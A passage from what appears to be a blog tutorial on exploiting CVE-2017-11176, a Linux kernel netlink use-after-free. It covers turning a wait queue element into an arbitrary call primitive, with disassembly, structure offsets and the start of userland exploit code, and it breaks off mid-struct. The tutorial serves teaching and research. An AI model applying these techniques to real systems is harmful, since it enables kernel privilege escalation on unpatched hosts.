<span class="w">    </span><span class="kt">void</span><span class="w">            </span><span class="p">(</span><span class="o">*</span><span class="n">netlink_rcv</span><span class="p">)(</span><span class="k">struct</span> <span class="nc">sk_buff</span><span class="w"> </span><span class="o">*</span><span class="n">skb</span><span class="p">);</span><span class="w">    </span><span class="c1">// &lt;----- one FP</span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">module</span><span class="w">       </span><span class="o">*</span><span class="n">module</span><span class="p">;</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p>Yay! We have lots of choices :-). What is a good <em>arbitrary call primitive</em>? One that:</p><ul><li>is <em>quickly</em> reachable from a syscall (i.e. small call trace)</li><li><em>quickly</em> goes out of the syscall once called (i.e. there is no code "after" the arbitrary call)</li><li>can be reached and does not require to pass lots of checks</li><li>does not have side effect on any kernel data structure</li></ul><p>The most obvious first solution would be to put an arbitrary value in place of <strong>netlink_rcv</strong> function pointer. This FP is invoked by <em>netlink_unicast_kernel()</em>. However, using this primitive is a bit tedious. In particular, there are lots of checks to validate AND it has side-effects on our structure. The second most obvious choice would be the function pointers inside the <strong>netlink_callback</strong> structure. Again, this is not a "good" call primitive because reaching it is complex, it has lots of side-effects and we need to pass lots of checks.</p><p>The solution we choose is our old friend: <strong>wait queue</strong>. Hmm... but it does not have any function pointer?!</p><div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">__wait_queue_head</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">spinlock_t</span><span class="w"> </span><span class="n">lock</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">list_head</span><span class="w"> </span><span class="n">task_list</span><span class="p">;</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>
<span class="k">typedef</span><span class="w"> </span><span class="k">struct</span> <span class="nc">__wait_queue_head</span><span class="w"> </span><span class="n">wait_queue_head_t</span><span class="p">;</span><span class="w"></span>
</code></pre></div><p>You're right, but its elements do (hence the "indirect" function pointer):</p><div class="highlight"><pre><span></span><code><span class="k">typedef</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">wait_queue_func_t</span><span class="p">)(</span><span class="n">wait_queue_t</span><span class="w"> </span><span class="o">*</span><span class="n">wait</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="n">mode</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">flags</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">key</span><span class="p">);</span><span class="w"></span>

<span class="k">struct</span> <span class="nc">__wait_queue</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">flags</span><span class="p">;</span><span class="w"></span>
<span class="cp">#define WQ_FLAG_EXCLUSIVE   0x01</span>
<span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">private</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">wait_queue_func_t</span><span class="w"> </span><span class="n">func</span><span class="p">;</span><span class="w">               </span><span class="c1">// &lt;------ this one!</span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">list_head</span><span class="w"> </span><span class="n">task_list</span><span class="p">;</span><span class="w"> </span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p>In addition, we already know where this function pointer <em>func</em> is called (<em>__wake_up_common()</em>) and how to reach it (<em>setsockopt()</em>). If you don't remember how, please go back to <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html">part 2</a>. We used this to unblock the main thread.</p><p><strong>Again, there are always multiple ways to write an exploit.</strong> We choose this way because the reader should already be familiar with the wait queue now even though it might not be the <em>optimal</em> one. There are probably simpler ways but this (at least) works. Furthermore, it will show how to <em>mimic</em> kernel datastructure in userland (a common technique).</p><h2 id="controlling-wait-queue-element">Controlling Wait Queue Element</h2><p>In the previous section, it has been established that we will get an arbitrary call primitive with the help of wait queue. However, the wait queue itself does not have function pointer whereas its elements do. In order to reach them we will need to setup some stuff in userland. It will require to <em>mimic</em> some kernel data structure.</p><p><strong>We assume that we control the data at offset <em>wait</em> (i.e. the wait queue "head") of a <em>kmalloc-1024</em> object. This is done via <em>reallocation</em>.</strong></p><p>Let's look back at the <em>struct netlink_sock</em>. Note one important thing, the <em>wait</em> field is <strong>embedded inside <em>netlink_sock</em></strong>, this is not a pointer!</p><p><strong>WARNING</strong>: Pay special attention (double check) if a field is "embedded" or a "pointer". This is a source of bugs and mistakes.</p><p>Let's re-write the <em>netlink_sock</em> structure with:</p><div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">netlink_sock</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="c1">// ... cut ...</span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w">       </span><span class="o">*</span><span class="n">groups</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w">       </span><span class="n">state</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="p">{</span><span class="w">                             </span><span class="c1">// &lt;----- wait_queue_head_t wait;</span>
<span class="w">    </span><span class="n">spinlock_t</span><span class="w"> </span><span class="n">lock</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">list_head</span><span class="w"> </span><span class="n">task_list</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">    </span><span class="k">struct</span> <span class="nc">netlink_callback</span><span class="w"> </span><span class="o">*</span><span class="n">cb</span><span class="p">;</span><span class="w">                      </span>
<span class="w">  </span><span class="c1">// ... cut ...</span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p>Let's expand it even further. The <em>spinlock_t</em> is actually "just" an unsigned int (check the definition, take care about CONFIG_ preprocessor), while "struct list_head" is a simple structure with two pointers:</p><div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">list_head</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">list_head</span><span class="w"> </span><span class="o">*</span><span class="n">next</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">prev</span><span class="p">;</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p>That is:</p><div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">netlink_sock</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="c1">// ... cut ...</span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w">       </span><span class="o">*</span><span class="n">groups</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w">       </span><span class="n">state</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="p">{</span><span class="w">                             </span><span class="c1">// &lt;----- wait_queue_head_t wait;</span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">slock</span><span class="p">;</span><span class="w">         </span><span class="c1">// &lt;----- ARBITRARY DATA HERE</span>
<span class="w">                                </span><span class="c1">// &lt;----- padded or not ? check disassembly!</span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">list_head</span><span class="w"> </span><span class="o">*</span><span class="n">next</span><span class="p">;</span><span class="w">     </span><span class="c1">// &lt;----- ARBITRARY DATA HERE</span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">list_head</span><span class="w"> </span><span class="o">*</span><span class="n">prev</span><span class="p">;</span><span class="w">     </span><span class="c1">// &lt;----- ARBITRARY DATA HERE</span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">    </span><span class="k">struct</span> <span class="nc">netlink_callback</span><span class="w"> </span><span class="o">*</span><span class="n">cb</span><span class="p">;</span><span class="w">                      </span>
<span class="w">  </span><span class="c1">// ... cut ...</span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p>While reallocating, we will have to set some special value in <strong>slock</strong>, <strong>next</strong> and <strong>prev</strong> fields. To know "what" value, let's remind the call trace up to <strong>__wake_up_common()</strong> while expanding all parameters:</p><div class="highlight"><pre><span></span><code>- SYSCALL(setsockopt)
- netlink_setsockopt(...)
- wake_up_interruptible(&amp;nlk-&gt;wait)
- __wake_up_(&amp;nlk-&gt;wait, TASK_INTERRUPTIBLE, 1, NULL)           // &lt;----- deref "slock"
- __wake_up_common(&amp;nlk-&gt;wait, TASK_INTERRUPTIBLE, 1, 0, NULL)
</code></pre></div><p>The code is:</p><div class="highlight"><pre><span></span><code><span class="w">      </span><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">__wake_up_common</span><span class="p">(</span><span class="n">wait_queue_head_t</span><span class="w"> </span><span class="o">*</span><span class="n">q</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">mode</span><span class="p">,</span><span class="w"></span>
<span class="w">            </span><span class="kt">int</span><span class="w"> </span><span class="n">nr_exclusive</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">wake_flags</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">key</span><span class="p">)</span><span class="w"></span>
<span class="w">      </span><span class="p">{</span><span class="w"></span>
<span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">     </span><span class="n">wait_queue_t</span><span class="w"> </span><span class="o">*</span><span class="n">curr</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">next</span><span class="p">;</span><span class="w"></span>

<span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w">     </span><span class="n">list_for_each_entry_safe</span><span class="p">(</span><span class="n">curr</span><span class="p">,</span><span class="w"> </span><span class="n">next</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">task_list</span><span class="p">,</span><span class="w"> </span><span class="n">task_list</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w">       </span><span class="kt">unsigned</span><span class="w"> </span><span class="n">flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">flags</span><span class="p">;</span><span class="w"></span>

<span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="w">       </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">func</span><span class="p">(</span><span class="n">curr</span><span class="p">,</span><span class="w"> </span><span class="n">mode</span><span class="p">,</span><span class="w"> </span><span class="n">wake_flags</span><span class="p">,</span><span class="w"> </span><span class="n">key</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"></span>
<span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="w">           </span><span class="p">(</span><span class="n">flags</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">WQ_FLAG_EXCLUSIVE</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!--</span><span class="n">nr_exclusive</span><span class="p">)</span><span class="w"></span>
<span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="w">         </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>We already studied this function. The difference now is that it will manipulate reallocated data (instead of legitimate wait queue elements). It does:</p><ul><li>[0] - declare pointers to <strong>wait queue elements</strong></li><li>[1] - iterate over the <em>task_list</em> doubly-linked list and set <strong>curr</strong> and <strong>next</strong></li><li>[2] - deference the <em>flag</em> offset of the current wait queue element <em>curr</em></li><li>[3] - <strong>call the function pointer <em>func</em> of the current element</strong></li><li>[4] - test if the <em>flag</em> has the WQ_FLAG_EXCLUSIVE bit set and if there is no more task to wake up</li><li>[5] - if so, break</li></ul><p>The ultimate arbitrary call primitive will be invoked at [3].</p><p><strong>NOTE</strong>: If you do not understand the <em>list_for_each_entry_safe()</em> macro now, please go back to the <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html#doubly-linked-circular-list-usage">Doubly Linked Circular List Usage</a> section.</p><p>Let's summarize:</p><ul><li>if we can control the content of a wait queue element, we have an <em>arbitrary call primitive</em> with the <em>func</em> function pointer</li><li>we will reallocate a <em>fake struct netlink_sock</em> object with controlled data (type confusion)</li><li>The <em>netlink_sock</em> object has the head of the wait queue list</li></ul><p>That is, we will <strong>overwrite the <em>next</em> and <em>prev</em> field of the wait_queue_head_t (i.e. <em>wait</em> field) and make it point to USERLAND</strong>. Again, the wait queue element (<em>curr</em>) will be in USERLAND.</p><p>Because it will point to userland, we can control the content of a wait queue element, hence the arbitrary call. However, <em>__wake_up_common()</em> poses some challenges.</p><p>First, we need to deal with the <em>list_for_each_entry_safe()</em> macro:</p><div class="highlight"><pre><span></span><code><span class="cp">#define list_for_each_entry_safe(pos, n, head, member)          \</span>
<span class="cp">    for (pos = list_first_entry(head, typeof(*pos), member),    \</span>
<span class="cp">        n = list_next_entry(pos, member);           \</span>
<span class="cp">         &amp;pos-&gt;member != (head);                    \</span>
<span class="cp">         pos = n, n = list_next_entry(n, member))</span>
</code></pre></div><p>Since <em>doubly-linked lists</em> are circular, it means that the last element in the wait queue list need to point back to the head of the list (<em>&amp;nlk-&gt;wait</em>). Otherwise, the <em>list_for_each_entry()</em> macro will loop indefinitely or eventually does a bad deref. We need to avoid it!</p><p>Fortunately, <strong>we can stop the loop if we can reach the <em>break</em> statement [5]</strong>. It is reachable if:</p><ol><li>the called arbitrary function returns a non-zero value AND</li><li>the WQ_FLAG_EXCLUSIVE bit is set in our userland wait queue element AND</li><li><em>nr_exclusive</em> reaches zero</li></ol><p>The <em>nr_exclusive</em> argument is set to one during <em>__wake_up_common()</em> invokation. That is, it resets to zero after the first arbitrary call. Setting the WQ_FLAG_EXCLUSIVE bit is easy, since we control the content of the userland wait queue element. Finally, the restriction about the return value of (arbitrary) called function will be considered in <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html">part 4</a>. For now, we will assume that we call a gadget that returns a non-zero value. In this article, we will simply call <strong>panic()</strong> which never returns and prints a nice stack trace (i.e. we can validate the exploit succeeded).</p><p>Next, because this is the "safe" version of the list_for_each_entry(), it means <strong>the second element of the list will be dereferenced BEFORE the arbitrary call primitive.</strong></p><p>That is, we will need to set proper value in the <strong><em>next</em> and <em>prev</em> field of the userland wait queue element</strong>. Since we do not know the address of <em>&amp;nlk-&gt;wait</em> (assuming <em>dmesg</em> is not accessible) AND have a way to make the loop stop with [5], we will simply make it point to a fake next wait queue element.</p><p><strong>WARNING</strong>: This "fake" next element must be <em>readable</em> otherwise the kernel will crash because of a bad deref (i.e. <em>page fault</em>). This will be explained in deeper detail in <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html">part 4</a>.</p><p>In this section we saw what should be the value in the <em>next</em> and <em>prev</em> field of the reallocated <em>netlink_sock</em> object (i.e. pointer to our userland wait queue element). Next, we saw what was the pre-requisites in the userland wait queue element to access the arbitrary call primitive and get out of the <em>list_for_each_entry_safe()</em> macro properly. It is time to implement it!</p><h2 id="find-offsets">Find Offsets</h2><p>As we did with the reallocation checker, we will need to disassemble the code of <em>__wake_up_common()</em> to find various offsets. First, let's find its address:</p><div class="highlight"><pre><span></span><code>$ grep <span class="s2">"__wake_up_common"</span> System.map-2.6.32 
ffffffff810618b0 t __wake_up_common
</code></pre></div><p>Remember the ABI, <em>__wake_up_common()</em> has five arguments:</p><ol><li><strong>rdi</strong>: wait_queue_head_t *q</li><li><strong>rsi</strong>: unsigned int mode</li><li><strong>rdx</strong>: int nr_exclusive</li><li><strong>rcx</strong>: int wake_flags</li><li><strong>r8</strong> : void *key</li></ol><p>The function starts with the prologue and then, it saves some parameters on the stack (making some registers available):</p><div class="highlight"><pre><span></span><code>ffffffff810618c6:       89 75 cc                mov    DWORD PTR [rbp-0x34],esi // save 'mode' in the stack
ffffffff810618c9:       89 55 c8                mov    DWORD PTR [rbp-0x38],edx // save 'nr_exclusive' in the stack
</code></pre></div><p>Then, there is the <strong>list_for_each_entry_safe()</strong> macro initialization:</p><div class="highlight"><pre><span></span><code>ffffffff810618cc:       4c 8d 6f 08             lea    r13,[rdi+0x8]            // store wait list head in R13
ffffffff810618d0:       48 8b 57 08             mov    rdx,QWORD PTR [rdi+0x8]  // pos = list_first_entry()
ffffffff810618d4:       41 89 cf                mov    r15d,ecx                 // store "wake_flags" in R15
ffffffff810618d7:       4d 89 c6                mov    r14,r8                   // store "key" in R14
ffffffff810618da:       48 8d 42 e8             lea    rax,[rdx-0x18]           // retrieve "curr" from "task_list"
ffffffff810618de:       49 39 d5                cmp    r13,rdx                  // test "pos != wait_head"
ffffffff810618e1:       48 8b 58 18             mov    rbx,QWORD PTR [rax+0x18] // save "task_list" in RBX
ffffffff810618e5:       74 3f                   je     0xffffffff81061926       // jump to exit
ffffffff810618e7:       48 83 eb 18             sub    rbx,0x18                 // RBX: current element
ffffffff810618eb:       eb 0a                   jmp    0xffffffff810618f7       // start looping!
ffffffff810618ed:       0f 1f 00                nop    DWORD PTR [rax]
</code></pre></div><p>The code starts by updating the "curr" pointer (ignored during first loop) and then, the core of the loop itself:</p><div class="highlight"><pre><span></span><code>ffffffff810618f0:       48 89 d8                mov    rax,rbx                  // set "currr" in RAX
ffffffff810618f3:       48 8d 5a e8             lea    rbx,[rdx-0x18]           // prepare "next" element in RBX
ffffffff810618f7:       44 8b 20                mov    r12d,DWORD PTR [rax]     // "flags = curr-&gt;flags"
ffffffff810618fa:       4c 89 f1                mov    rcx,r14                  // 4th argument "key"
ffffffff810618fd:       44 89 fa                mov    edx,r15d                 // 3nd argument "wake_flags"
ffffffff81061900:       8b 75 cc                mov    esi,DWORD PTR [rbp-0x34] // 2nd argument "mode"
ffffffff81061903:       48 89 c7                mov    rdi,rax                  // 1st argument "curr"
ffffffff81061906:       ff 50 10                call   QWORD PTR [rax+0x10]     // ARBITRARY CALL PRIMITIVE
</code></pre></div><p>Every statement of the "if()" is evaluated to know if it should break or not:</p><div class="highlight"><pre><span></span><code>ffffffff81061909:       85 c0                   test   eax,eax                  // test "curr-&gt;func()" return code
ffffffff8106190b:       74 0c                   je     0xffffffff81061919       // goto next element
ffffffff8106190d:       41 83 e4 01             and    r12d,0x1                 // test "flags &amp; WQ_FLAG_EXCLUSIVE"
ffffffff81061911:       74 06                   je     0xffffffff81061919       // goto next element
ffffffff81061913:       83 6d c8 01             sub    DWORD PTR [rbp-0x38],0x1 // decrement "nr_exclusive"
ffffffff81061917:       74 0d                   je     0xffffffff81061926       // "break" statement
</code></pre></div><p>Iterate in <em>list_for_each_entry_safe()</em> and jump back if necessary:</p><div class="highlight"><pre><span></span><code>ffffffff81061919:       48 8d 43 18             lea    rax,[rbx+0x18]           // "pos = n"
ffffffff8106191d:       48 8b 53 18             mov    rdx,QWORD PTR [rbx+0x18] // "n = list_next_entry()"
ffffffff81061921:       49 39 c5                cmp    r13,rax                  // compare to wait queue head
ffffffff81061924:       75 ca                   jne    0xffffffff810618f0       // loop back (next element)
</code></pre></div><p>That is, the wait queue elements offsets are:</p><div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">__wait_queue</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">flags</span><span class="p">;</span><span class="w">               </span><span class="c1">// &lt;----- offset = 0x00 (padded)</span>
<span class="cp">#define WQ_FLAG_EXCLUSIVE   0x01</span>
<span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">private</span><span class="p">;</span><span class="w">                    </span><span class="c1">// &lt;----- offset = 0x08</span>
<span class="w">    </span><span class="n">wait_queue_func_t</span><span class="w"> </span><span class="n">func</span><span class="p">;</span><span class="w">           </span><span class="c1">// &lt;----- offset = 0x10</span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">list_head</span><span class="w"> </span><span class="n">task_list</span><span class="p">;</span><span class="w">       </span><span class="c1">// &lt;----- offset = 0x18</span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p>In addition, we know that the "task_list" field in the <em>wait_queue_head_t</em> structure is located at offset 0x8.</p><p>This was quite predictable, but it is important to understand the code in assembly in order to know where exactly the arbitrary call primitive is invoked (<strong>0xffffffff81061906</strong>). This will be very handy when debugging. In addition, we know the state of various registers which would be <em>mandatory</em> in <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html">part 4</a>.</p><p>The next step, is to find the address of the <em>wait</em> field in the <em>struct netlinksock</em>. We can retrieve it from <strong>netlink_setsockopt()</strong> which call <em>wake_up_interruptible()</em>:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">netlink_setsockopt</span><span class="p">(</span><span class="k">struct</span> <span class="nc">socket</span><span class="w"> </span><span class="o">*</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">level</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">optname</span><span class="p">,</span><span class="w"></span>
<span class="w">                  </span><span class="kt">char</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="n">optval</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">optlen</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">sk</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">netlink_sock</span><span class="w"> </span><span class="o">*</span><span class="n">nlk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nlk_sk</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">val</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="c1">// ... cut ...</span>

<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="nl">NETLINK_NO_ENOBUFS</span><span class="p">:</span><span class="w"></span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">val</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">flags</span><span class="w"> </span><span class="o">|=</span><span class="w"> </span><span class="n">NETLINK_RECV_NO_ENOBUFS</span><span class="p">;</span><span class="w"></span>
<span class="w">            </span><span class="n">clear_bit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">state</span><span class="p">);</span><span class="w"></span>
<span class="w">            </span><span class="n">wake_up_interruptible</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">wait</span><span class="p">);</span><span class="w">    </span><span class="c1">// &lt;---- first arg has our offset!</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"></span>
<span class="w">            </span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">flags</span><span class="w"> </span><span class="o">&amp;=</span><span class="w"> </span><span class="o">~</span><span class="n">NETLINK_RECV_NO_ENOBUFS</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="k">break</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="c1">// ... cut ...</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p><strong>NOTE</strong>: From the previous section, we know that the <em>groups</em> field is located <em>0x2a0</em>. Based on the structure layout we can <em>predict</em> than the offset will be something like <em>0x2b0</em>, but we need to validate it. Sometimes it is not that obvious...</p><p>Function, <em>netlink_setsockopt()</em> is larger than <em>__wake_up_common()</em>. If you don't have a disassembler like IDA, it might be harder to locate the end of this function. However, we do not need to reverse the whole function! We only need to locate the call to <em>wake_up_interruptible()</em> macro which invokes <em>__wake_up()</em>. Let's find this call!</p><div class="highlight"><pre><span></span><code>$ egrep <span class="s2">"netlink_setsockopt| __wake_up</span>$<span class="s2">"</span> System.map-2.6.32 
ffffffff81066560 T __wake_up
ffffffff814b8090 t netlink_setsockopt
</code></pre></div><p>That is:</p><div class="highlight"><pre><span></span><code>ffffffff814b81a0:       41 83 8c 24 94 02 00    or     DWORD PTR [r12+0x294],0x8    // nlk-&gt;flags |= NETLINK_RECV_NO_ENOBUFFS
ffffffff814b81a7:       00 08 
ffffffff814b81a9:       f0 41 80 a4 24 a8 02    lock and BYTE PTR [r12+0x2a8],0xfe  // clear_bit()
ffffffff814b81b0:       00 00 fe 
ffffffff814b81b3:       49 8d bc 24 b0 02 00    lea    rdi,[r12+0x2b0]              // 1st arg = &amp;nlk-&gt;wait
ffffffff814b81ba:       00 
ffffffff814b81bb:       31 c9                   xor    ecx,ecx                      // 4th arg = NULL (key)
ffffffff814b81bd:       ba 01 00 00 00          mov    edx,0x1                      // 3nd arg = 1 (nr_exclusive)
ffffffff814b81c2:       be 01 00 00 00          mov    esi,0x1                      // 2nd arg = TASK_INTERRUPTIBLE
ffffffff814b81c7:       e8 94 e3 ba ff          call   0xffffffff81066560           // call __wake_up()
ffffffff814b81cc:       31 c0                   xor    eax,eax                      // err = 0
ffffffff814b81ce:       e9 e9 fe ff ff          jmp    0xffffffff814b80bc           // jump to exit
</code></pre></div><p>Our intuition was good the offset is <strong>0x2b0</strong>.</p><p>Good! So far we know what is the offset of <em>wait</em> in the <em>netlink_sock</em> structure, as well as the layout of a wait queue element. In addition, we precisely know where the arbitrary call primitive is invoked (ease debugging). Let's <em>mimic</em> the kernel data structure and fill the reallocation data.</p><h2 id="mimicking-kernel-datastructure">Mimicking Kernel Datastructure</h2><p>Since developing with hardcoded offset can quickly lead to unreadable exploit code, it is always good to <em>mimic</em> kernel datastructure. In order to check that we don't do any mistake we will <em>shamelessly</em> adapt the <strong>MAYBE_BUILD_BUG_ON</strong> macro to build a <em>static_assert</em> macro (i.e. checks during compilation time):</p><div class="highlight"><pre><span></span><code><span class="cp">#define BUILD_BUG_ON(cond) ((void)sizeof(char[1 - 2 * !!(cond)]))</span>
</code></pre></div><p>If the condition is true, it will try to declare an array with a negative size which produce a compilation error. Pretty handy!</p><p><em>Mimicking</em> simple structure is easy, you just need to declare them as the kernel does:</p><div class="highlight"><pre><span></span><code><span class="c1">// target specific offset</span>
<span class="cp">#define NLK_PID_OFFSET            0x288</span>
<span class="cp">#define NLK_GROUPS_OFFSET         0x2a0</span>
<span class="cp">#define NLK_WAIT_OFFSET           0x2b0</span>
<span class="cp">#define WQ_HEAD_TASK_LIST_OFFSET  0x8</span>
<span class="cp">#define WQ_ELMT_FUNC_OFFSET       0x10</span>
<span class="cp">#define WQ_ELMT_TASK_LIST_OFFSET  0x18</span>

<span class="k">struct</span> <span class="nc">list_head</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">list_head</span><span class="w"> </span><span class="o">*</span><span class="n">next</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">prev</span><span class="p">;</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>

<span class="k">struct</span> <span class="nc">wait_queue_head</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">slock</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">list_head</span><span class="w"> </span><span class="n">task_list</span><span class="p">;</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>

<span class="k">typedef</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">wait_queue_func_t</span><span class="p">)(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">wait</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="n">mode</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">flags</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">key</span><span class="p">);</span><span class="w"></span>

<span class="k">struct</span> <span class="nc">wait_queue</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">flags</span><span class="p">;</span><span class="w"></span>
